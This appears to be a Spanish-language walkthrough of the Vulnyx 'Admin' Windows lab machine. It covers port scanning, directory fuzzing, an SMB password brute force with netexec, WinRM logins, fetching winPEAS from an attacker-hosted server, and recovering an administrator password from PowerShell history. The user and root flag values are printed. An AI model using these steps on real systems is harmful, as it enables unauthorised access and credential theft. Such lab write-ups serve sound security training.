---
icon: flag
---

# Admin Vulnyx (Easy - Windows)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 04:51 EDT
Nmap scan report for 192.168.5.68
Host is up (0.0059s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp  open  pando-pub?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:B6:A0:0C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: ADMIN, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:b6:a0:0c (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
|_clock-skew: -3s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-07-30T08:53:57
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 176.48 seconds
```

Veremos varios puertos interesantes, por lo que vamos a realizar un poco de `fuzzing` para ver que encontramos.

Si entramos en el puerto `80` veremos una web normal y corriente, si intentamos enumerar el `SAMBA` no veremos gran cosa, ya que no se podra enumerar de forma anonima, por lo que vamos a investigar mas por el puerto `80` a ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP> -w <WORDLIST> -x aspx,html,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.68
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              aspx,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/tasks.txt            (Status: 200) [Size: 98]
Progress: 19000 / 19004 (99.98%)
===============================================================
Finished
===============================================================
```

Veremos un directorio interesante llamado `tasks.txt` si entramos dentro veremos lo siguiente:

```
URL = http://<IP>/tasks.txt
```

Info:

```
Pending tasks:

 - Finish website
 - Update OS
 - Drink coffee
 - Rest
 - Change password

By hope
```

Vemos un nombre de usuario llamado `hope`, vamos a realizar fuerza bruta con `netexec` de esta forma.

## NetExec

Antes vamos a pasar el `rockyou.txt` a `UTF-8` para que no de ningun error.

```shell
iconv -f ISO-8859-1 -t UTF-8 /usr/share/wordlists/rockyou.txt -o rockyou-utf8.txt
```

Una vez echo esto, vamos a utilizarlo de esta forma.

```shell
netexec smb <IP> -u hope -p rockyou_utf8.txt
```

Info:

```
SMB         192.168.5.68    445    ADMIN            [*] Windows 10 / Server 2019 Build 19041 x64 (name:ADMIN) (domain:ADMIN) (signing:False) (SMBv1:False)
...........................<RESTO_DE_INTENTOS>.....................................
SMB         192.168.5.68    445    ADMIN            [+] ADMIN\hope:loser
```

Vemos que hemos encontrado unas credenciales, vamos a probarlas de esta forma.

```shell
netexec smb <IP> -u hope -p loser -x "id"
```

Info:

```
SMB         192.168.5.68    445    ADMIN            [*] Windows 10 / Server 2019 Build 19041 x64 (name:ADMIN) (domain:ADMIN) (signing:False) (SMBv1:False)
SMB         192.168.5.68    445    ADMIN            [+] ADMIN\hope:loser
```

Vemos que funciona perfectamente, por lo que vamos a realizar un poco de `fuzzing` con dichas credenciales en el servidor `SAMBA`.

```shell
smbclient -L //<IP>/ -U hope
```

Info:

```
Password for [WORKGROUP\hope]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Admin remota
        C$              Disk      Recurso predeterminado
        IPC$            IPC       IPC remota
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.5.68 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

No veremos ningun recurso compartido que se haya creado nuevo, por lo que no nos interesa ninguno.

Recordemos que tenemos el puerto `5985` (`WinRM`) abierto, por lo que vamos a probar a conectarnos con la herramienta de `evil-winrm`.

## Escalate user hope

### Evil-winrm

```shell
evil-winrm -i <IP> -u hope -p 'loser'
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\hope\Documents> whoami
admin\hope
```

Veremos que hemos accedido de forma correcta, por lo que vamos a investigar un poco, pero antes leeremos la `flag` del usuario.

> user.txt

```
aacd4aebb5743ba45d3b4591ac03ace1
```

## Escalate Privileges

Despues de buscar un rato y no encontrar gran cosa, vamos a utilizar un script automatizado llamado `winPeasx64.exe` para poder enumerar el sistema completo a ver que vemos.

URL = [Download winPeasx64.exe GitHub](https://github.com/peass-ng/PEASS-ng/releases/tag/20240707-68b6f322)

Una vez que nos lo hayamos descargado en la maquina `host` del `kali` vamos abrir un servidor de `python3` para pasarnoslo a la maquina victima.

```shell
python3 -m http.server 80
```

En la maquina victima haremos esto.

```powershell
cd ../Desktop
Invoke-WebRequest -Uri http://<IP>/winPEASx64.exe -OutFile C:\Users\hope\Desktop\winPEASx64.exe
```

Una vez descargado, vamos a ejecutarlo de esta forma:

```powershell
.\winPEASx64.exe
```

Info:

```
...............................<RESTO_DE_CODIGO>...................................
ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.19041.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\hope\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 234B
...............................<RESTO_DE_CODIGO>...................................
```

Veremos un archivo interesante, que si lo leemos veremos lo siguiente:

```shell
type C:\Users\hope\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Info:

```
Set-LocalUser -Name "administrator" -Password (ConvertTo-SecureString "SuperAdministrator123" -AsPlainText -Force)
```

Vemos que aparece la contraseña del `administrador` en texto plano, vamos a ver si realmente funciona.

```shell
evil-winrm -i <IP> -u Administrator -p 'SuperAdministrator123'
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\administrator\Documents> whoami
admin\administrator
```

Veremos que ha funcionado, por lo que vamos a leer la `flag` de `root`.

> root.txt

```
fe586ba8f585e1ea97347be057659b81
```
